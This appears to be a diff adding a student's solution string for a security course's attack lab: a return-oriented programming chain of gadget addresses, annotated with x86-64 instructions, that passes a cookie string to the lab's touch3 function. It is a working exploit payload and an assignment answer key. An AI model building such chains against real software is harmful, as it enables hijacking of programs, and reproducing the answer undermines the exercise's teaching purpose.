@@ -1,0 +1,11 @@
+bf 22 40 00 00 00 00 00 # popq %rax 
+20 00 00 00 00 00 00 00
+4c 24 40 00 00 00 00 00 # movq %eax %edx
+e8 23 40 00 00 00 00 00 # movl %edx %ecx
+27 23 40 00 00 00 00 00 # movl %ecx %esi
+93 23 40 00 00 00 00 00 # movq %rsp %rax
+ca 22 40 00 00 00 00 00 # movq %rax %rdi
+11 23 40 00 00 00 00 00 # lea  (%rdi,%rsi,1),%rax
+df 22 40 00 00 00 00 00 # movq %rax,%rdi 
+22 21 40 00 00 00 00 00 # touch3 
+35 34 37 35 36 38 32 35 # cookie 
